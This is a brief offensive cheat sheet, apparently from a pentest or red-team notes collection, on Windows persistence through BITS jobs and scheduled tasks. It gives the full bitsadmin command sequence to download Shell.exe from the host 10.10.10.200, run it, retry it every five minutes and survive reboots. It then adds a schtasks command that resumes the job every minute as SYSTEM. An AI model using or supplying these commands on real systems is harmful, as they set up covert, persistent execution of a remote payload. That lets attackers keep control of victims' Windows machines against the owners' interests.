# BITS

### 1) BITS

##### Create BITS Job

    bitsadmin /create Shell

##### Point to URL of shell

    bitsadmin /addfile Shell "http://10.10.10.200/Shell.exe" "C:\Windows\Temp\Shell.exe"

##### Set Command

    bitsadmin /SetNotifyCmdLine Shell C:\Windows\Temp\Shell.exe NUL

##### Set to run every 5 minutes on transient error

    bitsadmin /SetMinRetryDelay "Shell" 300

##### Resume job

    bitsadmin /resume Shell

BITS jobs will also run again after a reboot when the user it was created under logs in again.

### 2) Schtasks

    schtasks /create /tn "BitsJob" /sc minute /mo 1 /ru SYSTEM /tr "C:\Windows\System32\bitsadmin.exe /resume "\Shell\""
